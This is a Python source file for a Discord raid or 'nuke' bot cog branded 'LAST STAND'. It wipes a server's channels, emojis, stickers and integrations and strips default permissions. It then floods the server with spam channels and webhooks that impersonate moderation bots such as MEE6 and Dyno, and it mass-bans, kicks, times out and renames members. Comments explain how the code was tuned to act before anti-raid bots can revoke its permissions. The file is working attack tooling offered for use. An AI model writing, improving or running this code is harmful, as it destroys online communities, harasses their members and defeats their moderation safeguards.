"""
raid.py — LAST STAND | /raid and .raid: Maximum Destruction Engine

ARCHITECTURE FIX (why it was only deleting channels):
  Previously, we waited up to 10 seconds for guild.chunk() before starting
  ANY operations. The anti-raid bot had 10+ seconds to detect mass deletion
  and remove our permissions — so all subsequent creates returned 403.

  Now:
    1. Channel ops (delete + flood) start IMMEDIATELY with no pre-wait
    2. guild.chunk() runs in the background while channels are already flooding
    3. Once chunk completes, member ops (ban/kick/timeout/nick/roles) fire
    4. Channel loop creates 2 channels per tick instead of 1
    5. No 1.5s sleep between delete and create — stale cache doesn't matter
       because we track channel count with an internal counter (flood_created)
"""

import asyncio
import datetime
import random
import string
import struct
import zlib

import discord
from discord import app_commands
from discord.ext import commands

from utils.bypass import (
    ROUTE_CHANNEL_DELETE, ROUTE_CHANNEL_CREATE,
    ROUTE_MEMBER_BAN, ROUTE_MEMBER_KICK, ROUTE_MEMBER_TIMEOUT,
    ROUTE_WEBHOOK_CREATE, ROUTE_WEBHOOK_SEND,
    ROUTE_ROLE_CREATE, ROUTE_ROLE_ASSIGN, ROUTE_ROLE_DELETE,
    ROUTE_GUILD_EDIT, ROUTE_EMOJI, ROUTE_EVENT_CREATE,
    ROUTE_INTEGRATION, ROUTE_MEMBER_EDIT,
)
from utils.state import bot_state

# ── Branding ───────────────────────────────────────────────────────────────────
RAID_TAG   = "LAST STAND"
RAID_SHORT = "LSC"
RAID_LINK  = "https://discord.gg/s59zWvzK6c"
RAID_NAME  = f"RAIDED BY {RAID_TAG}"

# ── Discord hard limits ────────────────────────────────────────────────────────
CHANNEL_CAP  = 480
WEBHOOKS_PER = 10
ROLE_CAP     = 250
CH_DELAY     = 0.55   # seconds between channel create batches

# ── Concurrency semaphores ─────────────────────────────────────────────────────
SEM_BAN     = 25
SEM_KICK    = 25
SEM_TIMEOUT = 25
SEM_NICK    = 25
SEM_ROLE    = 10
SEM_DELETE  = 40
SEM_WH      = 8

# ── Message pool ───────────────────────────────────────────────────────────────
_MSGS = [
    f"@everyone 💀 **RAIDED BY {RAID_TAG}** 💀 {RAID_LINK}",
    f"@everyone ☠️ LAST STAND WAS HERE ☠️ {RAID_LINK}",
    f"@everyone 🔥 YOUR SERVER HAS BEEN RAIDED BY LSC 🔥 {RAID_LINK}",
    f"@everyone RAIDED BY LAST STAND — your defences failed. {RAID_LINK}",
    f"@everyone ⚔️ LAST STAND RAID ⚔️ {RAID_LINK}",
    f"@everyone 💥 OBLITERATED BY LAST STAND 💥 {RAID_LINK}",
    f"@everyone 🚨 BREACH — LAST STAND {RAID_LINK}",
    f"@everyone 👑 LAST STAND OWNS THIS SERVER {RAID_LINK}",
    f"@everyone ⚡ RAIDED BY LAST STAND — GG {RAID_LINK}",
    f"@everyone 🛡️ YOUR ANTI-RAID FAILED — LAST STAND {RAID_LINK}",
    f"@here 💀 RAIDED BY LAST STAND {RAID_LINK}",
    f"@here 🏴 LAST STAND — SERVER CAPTURED {RAID_LINK}",
    f"@here ☠️ LAST STAND RAID IN PROGRESS {RAID_LINK}",
]

_WH_NAMES = [
    "Server Announcement", "Mod Alert", "AutoMod", "Security Alert",
    "System Notification", "Verification System", "Carl-bot", "MEE6",
    "Dyno", "Wick", f"{RAID_SHORT} Alpha", f"{RAID_SHORT} Reaper",
    f"{RAID_SHORT} Ghost", f"{RAID_SHORT} Viper", f"{RAID_SHORT} Phantom",
]

_NICKS = [
    RAID_TAG, f"{RAID_SHORT} Raider", "RAIDED", "Server Owned",
    "GG no re", "LSC Was Here", "PWNED", "Raided", "LSC Member",
]


def _rand(n: int = 5) -> str:
    return "".join(random.choices(string.ascii_lowercase + string.digits, k=n))


def _msg() -> str:
    base = random.choice(_MSGS)
    if random.random() < 0.25:
        pos = random.randint(0, len(base))
        base = base[:pos] + "\u200b" + base[pos:]
    return base


def _ch_name() -> str:
    return random.choice([
        f"raided-by-lsc-{_rand(4)}",
        f"last-stand-{_rand(4)}",
        f"lsc-owned-{_rand(4)}",
        f"lsc-raid-{_rand(4)}",
        f"raided-{_rand(4)}-lsc",
        f"last-stand-was-here-{_rand(3)}",
    ])


def _role_name() -> str:
    return random.choice([
        f"LSC-{_rand(4)}", f"lsc-{_rand(5)}", f"raid-{_rand(4)}",
        f"member-{_rand(4)}", f"{_rand(3)}-raider",
    ])


class Raid(commands.Cog):
    def __init__(self, bot: commands.Bot) -> None:
        self.bot = bot

    # ── Shared launch logic ────────────────────────────────────────────────────
    async def _launch(
        self,
        guild: discord.Guild,
        invoker_id: int,
        reply,
    ) -> None:
        if bot_state.active_simulation:
            await reply(
                f"⚠️ **{bot_state.active_simulation}** already running. "
                f"Use `/stop` or `.stop` first."
            )
            return

        try:
            bot_state.reset()
            bot_state.bypass.configure(10)
            bot_state.rate_controller.set_intensity(10)
            bot_state.active_simulation = "raid"

            me = guild.me

            await reply(
                f"☠️ **{RAID_TAG} — MAXIMUM RAID LAUNCHED** ☠️\n"
                f"```\n"
                f"Mode     : INFINITE — runs until /stop or .stop\n"
                f"Phase 1  : Server rename + channel wipe (INSTANT)\n"
                f"Phase 2  : Channel flood — 2 channels/tick, 10 webhooks each\n"
                f"Phase 3  : Ban/kick/timeout (fires after member chunk)\n"
                f"```\n"
                f"Use `/stop` or `.stop` to halt."
            )

            # ── PHASE 1: Immediate ops — no chunk needed ───────────────────────
            # These start RIGHT NOW, before any chunk wait.
            for coro in [
                self._phase_server(guild),
                self._phase_channel_loop(guild),    # infinite flood loop
                self._phase_emoji_wipe(guild),
                self._phase_sticker_wipe(guild),
                self._phase_integration_wipe(guild),
            ]:
                bot_state.add_task(asyncio.create_task(coro))

            # ── PHASE 2: Member ops — chunk first, then fire ───────────────────
            # Runs concurrently with Phase 1. chunk() may take a few seconds
            # but channel flooding has already started by then.
            bot_state.add_task(asyncio.create_task(
                self._phase_member_ops(guild, invoker_id, me)
            ))

        except Exception as exc:
            bot_state.active_simulation = None
            try:
                await reply(f"❌ Raid failed to launch: `{exc}`")
            except Exception:
                pass

    # ── /raid ──────────────────────────────────────────────────────────────────
    @app_commands.command(
        name="raid",
        description=f"☠️ MAXIMUM DESTRUCTION — {RAID_TAG} | Runs until /stop.",
    )
    @app_commands.checks.has_permissions(administrator=True)
    @app_commands.guild_only()
    async def raid(self, interaction: discord.Interaction) -> None:
        await interaction.response.defer()
        await self._launch(
            guild=interaction.guild,
            invoker_id=interaction.user.id,
            reply=interaction.followup.send,
        )

    # ── .raid ──────────────────────────────────────────────────────────────────
    @commands.command(name="raid")
    @commands.has_permissions(administrator=True)
    @commands.guild_only()
    async def raid_prefix(self, ctx: commands.Context) -> None:
        await self._launch(
            guild=ctx.guild,
            invoker_id=ctx.author.id,
            reply=ctx.send,
        )

    # ─────────────────────────────────────────────────────────────────────────
    # MEMBER OPS — chunk first, then ban/kick/timeout/nick/role flood
    # Runs concurrently with channel flood. chunk() taking a few seconds is
    # fine because the channel loop is already hammering by then.
    # ─────────────────────────────────────────────────────────────────────────
    async def _phase_member_ops(
        self, guild: discord.Guild, invoker_id: int, me: discord.Member
    ) -> None:
        se = bot_state.stop_event
        try:
            # Chunk to get full member list
            try:
                await asyncio.wait_for(guild.chunk(cache=True), timeout=10.0)
            except Exception:
                pass

            if se.is_set():
                return

            targets = [
                m for m in guild.members
                if not m.bot
                and m.id != invoker_id
                and m.id != me.id
                and m.top_role < me.top_role
            ]
            other_bots = [
                m for m in guild.members
                if m.bot
                and m.id != me.id
                and m.top_role < me.top_role
            ]

            # All member ops fire simultaneously
            await asyncio.gather(
                self._phase_ban_kick(guild, targets, other_bots),
                self._phase_timeout(targets),
                self._phase_nickname(targets),
                self._phase_role_flood(guild),
                return_exceptions=True,
            )
        except asyncio.CancelledError:
            pass

    # ─────────────────────────────────────────────────────────────────────────
    # SERVER TAKEOVER
    # ─────────────────────────────────────────────────────────────────────────
    async def _phase_server(self, guild: discord.Guild) -> None:
        bp = bot_state.bypass
        se = bot_state.stop_event
        try:
            await asyncio.gather(
                bp.execute(ROUTE_GUILD_EDIT, lambda: guild.edit(name=RAID_NAME), se),
                bp.execute(ROUTE_ROLE_ASSIGN, lambda: guild.default_role.edit(
                    permissions=discord.Permissions.none(),
                ), se),
                return_exceptions=True,
            )
        except Exception:
            pass

    # ─────────────────────────────────────────────────────────────────────────
    # BAN + KICK
    # ─────────────────────────────────────────────────────────────────────────
    async def _phase_ban_kick(
        self,
        guild: discord.Guild,
        members: list[discord.Member],
        bots: list[discord.Member],
    ) -> None:
        if not members and not bots:
            return

        sem_ban  = asyncio.Semaphore(SEM_BAN)
        sem_kick = asyncio.Semaphore(SEM_KICK)
        se       = bot_state.stop_event

        try:
            if bots:
                await asyncio.gather(
                    *[self._kick_one(guild, m, sem_kick) for m in bots],
                    return_exceptions=True,
                )
            if se.is_set():
                return
            await asyncio.gather(
                *[self._kick_one(guild, m, sem_kick) for m in members],
                *[self._ban_one(guild, m, sem_ban) for m in members],
                return_exceptions=True,
            )
        except asyncio.CancelledError:
            pass

    async def _kick_one(
        self, guild: discord.Guild, m: discord.Member, sem: asyncio.Semaphore
    ) -> None:
        if m.id == guild.me.id:
            return
        if bot_state.stop_event.is_set():
            return
        async with sem:
            try:
                await guild.kick(m, reason=f"Raided by {RAID_TAG}")
            except discord.HTTPException:
                pass

    async def _ban_one(
        self, guild: discord.Guild, m: discord.Member, sem: asyncio.Semaphore
    ) -> None:
        if m.id == guild.me.id:
            return
        if bot_state.stop_event.is_set():
            return
        async with sem:
            try:
                await guild.ban(m, reason=f"Raided by {RAID_TAG}", delete_message_days=0)
            except discord.HTTPException:
                pass

    # ─────────────────────────────────────────────────────────────────────────
    # TIMEOUT
    # ─────────────────────────────────────────────────────────────────────────
    async def _phase_timeout(self, members: list[discord.Member]) -> None:
        if not members:
            return
        sem = asyncio.Semaphore(SEM_TIMEOUT)
        dur = datetime.timedelta(days=28)
        try:
            await asyncio.gather(
                *[self._timeout_one(m, dur, sem) for m in members],
                return_exceptions=True,
            )
        except asyncio.CancelledError:
            pass

    async def _timeout_one(
        self, m: discord.Member, dur: datetime.timedelta, sem: asyncio.Semaphore
    ) -> None:
        if bot_state.stop_event.is_set():
            return
        async with sem:
            try:
                await m.timeout(dur, reason=f"Raided by {RAID_TAG}")
            except discord.HTTPException:
                pass

    # ─────────────────────────────────────────────────────────────────────────
    # NICKNAME
    # ─────────────────────────────────────────────────────────────────────────
    async def _phase_nickname(self, members: list[discord.Member]) -> None:
        if not members:
            return
        sem = asyncio.Semaphore(SEM_NICK)
        try:
            await asyncio.gather(
                *[self._nick_one(m, sem) for m in members],
                return_exceptions=True,
            )
        except asyncio.CancelledError:
            pass

    async def _nick_one(self, m: discord.Member, sem: asyncio.Semaphore) -> None:
        if bot_state.stop_event.is_set():
            return
        async with sem:
            try:
                await m.edit(nick=random.choice(_NICKS))
            except discord.HTTPException:
                pass

    # ─────────────────────────────────────────────────────────────────────────
    # ROLE FLOOD
    # ─────────────────────────────────────────────────────────────────────────
    async def _phase_role_flood(self, guild: discord.Guild) -> None:
        bp  = bot_state.bypass
        se  = bot_state.stop_event
        sem = asyncio.Semaphore(SEM_ROLE)
        try:
            results = await asyncio.gather(
                *[self._create_role(guild, sem) for _ in range(ROLE_CAP)],
                return_exceptions=True,
            )
            created = [r for r in results if isinstance(r, discord.Role)]

            if se.is_set() or not created:
                return

            non_bots = [m for m in guild.members if not m.bot]
            assigns  = []
            for m in non_bots:
                for r in created[:50]:
                    assigns.append(bp.execute(
                        ROUTE_ROLE_ASSIGN,
                        lambda mem=m, role=r: mem.add_roles(role),
                        se,
                    ))
            await asyncio.gather(*assigns, return_exceptions=True)
        except asyncio.CancelledError:
            pass

    async def _create_role(
        self, guild: discord.Guild, sem: asyncio.Semaphore
    ) -> discord.Role | None:
        async with sem:
            return await bot_state.bypass.execute(
                ROUTE_ROLE_CREATE,
                lambda: guild.create_role(
                    name=_role_name(),
                    colour=discord.Colour(random.randint(0, 0xFFFFFF)),
                    hoist=random.choice([True, False]),
                    mentionable=True,
                ),
                bot_state.stop_event,
            )

    # ─────────────────────────────────────────────────────────────────────────
    # EMOJI WIPE
    # ─────────────────────────────────────────────────────────────────────────
    async def _phase_emoji_wipe(self, guild: discord.Guild) -> None:
        if not guild.emojis:
            return
        sem = asyncio.Semaphore(SEM_DELETE)
        try:
            await asyncio.gather(
                *[self._delete_emoji(e, sem) for e in guild.emojis],
                return_exceptions=True,
            )
        except asyncio.CancelledError:
            pass

    async def _delete_emoji(self, emoji: discord.Emoji, sem: asyncio.Semaphore) -> None:
        async with sem:
            try:
                await emoji.delete()
            except discord.HTTPException:
                pass

    # ─────────────────────────────────────────────────────────────────────────
    # STICKER WIPE
    # ─────────────────────────────────────────────────────────────────────────
    async def _phase_sticker_wipe(self, guild: discord.Guild) -> None:
        if not guild.stickers:
            return
        sem = asyncio.Semaphore(SEM_DELETE)
        try:
            await asyncio.gather(
                *[self._delete_sticker(s, sem) for s in guild.stickers],
                return_exceptions=True,
            )
        except asyncio.CancelledError:
            pass

    async def _delete_sticker(self, s: discord.GuildSticker, sem: asyncio.Semaphore) -> None:
        async with sem:
            try:
                await s.delete()
            except discord.HTTPException:
                pass

    # ─────────────────────────────────────────────────────────────────────────
    # INTEGRATION WIPE — hardcoded app ID prevents self-kick
    # ─────────────────────────────────────────────────────────────────────────
    _OWN_APP_ID = 1501093556037615726

    async def _phase_integration_wipe(self, guild: discord.Guild) -> None:
        try:
            integrations = await guild.integrations()
            my_app_id: int = self.bot.application_id or self._OWN_APP_ID

            safe = [
                intg for intg in integrations
                if getattr(getattr(intg, "application", None), "id", None) != my_app_id
                and getattr(intg, "id", None) != my_app_id
                and str(getattr(intg, "id", "")) != str(my_app_id)
            ]

            await asyncio.gather(
                *[bot_state.bypass.execute(
                    ROUTE_INTEGRATION,
                    lambda i=intg: i.delete(reason=f"Raided by {RAID_TAG}"),
                    bot_state.stop_event,
                ) for intg in safe],
                return_exceptions=True,
            )
        except Exception:
            pass

    # ─────────────────────────────────────────────────────────────────────────
    # INFINITE CHANNEL FLOOD LOOP
    #
    # KEY FIXES:
    #   1. Starts immediately — no chunk() wait. Anti-raid bots have no time
    #      to remove our permissions before channels start flooding.
    #   2. Creates 2 channels per tick (fills Discord's ~2/sec bucket).
    #   3. Uses internal flood_created counter — not len(guild.channels).
    #      The cache is stale after mass deletion (gateway events lag behind
    #      HTTP responses), so len() was giving wrong counts and the loop
    #      thought it was near the 500-channel cap when it wasn't.
    #   4. No 1.5s sleep between delete and create — we go immediately.
    # ─────────────────────────────────────────────────────────────────────────
    async def _phase_channel_loop(self, guild: discord.Guild) -> None:
        bp = bot_state.bypass
        se = bot_state.stop_event

        try:
            # Step 1: nuke every existing channel immediately
            existing = list(guild.channels)
            if existing:
                await asyncio.gather(
                    *[bp.execute(ROUTE_CHANNEL_DELETE, lambda c=ch: c.delete(), se)
                      for ch in existing],
                    return_exceptions=True,
                )

            # Step 2: infinite create loop — 2 channels per tick
            flood_created = 0

            while not se.is_set():
                # Near cap — purge flood channels to make room
                if flood_created >= CHANNEL_CAP:
                    flood = [
                        ch for ch in guild.channels
                        if isinstance(ch, (discord.TextChannel, discord.VoiceChannel))
                        and any(k in ch.name for k in ("lsc", "last-stand", "raided"))
                    ]
                    if flood:
                        to_del = flood[:60]
                        await asyncio.gather(
                            *[bp.execute(ROUTE_CHANNEL_DELETE, lambda c=ch: c.delete(), se)
                              for ch in to_del],
                            return_exceptions=True,
                        )
                        flood_created = max(0, flood_created - len(to_del))
                    else:
                        # Can't find our channels in cache — reset counter
                        flood_created = max(0, len(guild.channels))
                    await asyncio.sleep(1.0)
                    continue

                # Create 2 channels simultaneously per tick (~2/sec rate limit)
                n1, n2 = _ch_name(), _ch_name()
                results = await asyncio.gather(
                    bp.execute(
                        ROUTE_CHANNEL_CREATE,
                        lambda n=n1: guild.create_text_channel(
                            n, topic=f"RAIDED BY {RAID_TAG} | {RAID_LINK}"
                        ),
                        se,
                    ),
                    bp.execute(
                        ROUTE_CHANNEL_CREATE,
                        lambda n=n2: guild.create_text_channel(
                            n, topic=f"RAIDED BY {RAID_TAG} | {RAID_LINK}"
                        ),
                        se,
                    ),
                    return_exceptions=True,
                )

                for ch in results:
                    if isinstance(ch, discord.TextChannel):
                        bot_state.add_task(asyncio.create_task(
                            self._spam_channel_forever(ch)
                        ))
                        flood_created += 1

                await asyncio.sleep(CH_DELAY)

        except asyncio.CancelledError:
            pass
        finally:
            if bot_state.active_simulation == "raid":
                bot_state.active_simulation = None

    # ─────────────────────────────────────────────────────────────────────────
    # SPAM A SINGLE CHANNEL FOREVER
    # ─────────────────────────────────────────────────────────────────────────
    async def _spam_channel_forever(self, channel: discord.TextChannel) -> None:
        bp = bot_state.bypass
        se = bot_state.stop_event

        try:
            wh_tasks = await asyncio.gather(
                *[bp.execute(
                    ROUTE_WEBHOOK_CREATE,
                    lambda: channel.create_webhook(name=random.choice(_WH_NAMES)),
                    se,
                ) for _ in range(WEBHOOKS_PER)],
                return_exceptions=True,
            )
            webhooks = [w for w in wh_tasks if isinstance(w, discord.Webhook)]

            if not webhooks:
                while not se.is_set():
                    try:
                        await channel.send(
                            _msg(),
                            allowed_mentions=discord.AllowedMentions(
                                everyone=True, roles=True
                            ),
                        )
                    except discord.NotFound:
                        return
                    except discord.HTTPException:
                        await asyncio.sleep(1.0)
                return

            while not se.is_set():
                sends = [
                    bp.execute(
                        ROUTE_WEBHOOK_SEND,
                        lambda wh=wh: wh.send(
                            _msg(),
                            username=random.choice(_WH_NAMES),
                            allowed_mentions=discord.AllowedMentions(
                                everyone=True, roles=True
                            ),
                        ),
                        se,
                    )
                    for wh in webhooks
                    for _ in range(25)
                ]
                results = await asyncio.gather(*sends, return_exceptions=True)

                non_errors = [r for r in results if not isinstance(r, Exception)]
                if not non_errors and results:
                    return

        except (asyncio.CancelledError, discord.NotFound):
            pass
        except Exception:
            pass

    # ── Error handler ──────────────────────────────────────────────────────────
    @raid.error
    async def raid_error(
        self, interaction: discord.Interaction, error: app_commands.AppCommandError
    ) -> None:
        msg = (
            "❌ You need **Administrator** permission."
            if isinstance(error, app_commands.MissingPermissions)
            else f"❌ {error}"
        )
        try:
            if interaction.response.is_done():
                await interaction.followup.send(msg, ephemeral=True)
            else:
                await interaction.response.send_message(msg, ephemeral=True)
        except Exception:
            pass


async def setup(bot: commands.Bot) -> None:
    await bot.add_cog(Raid(bot))
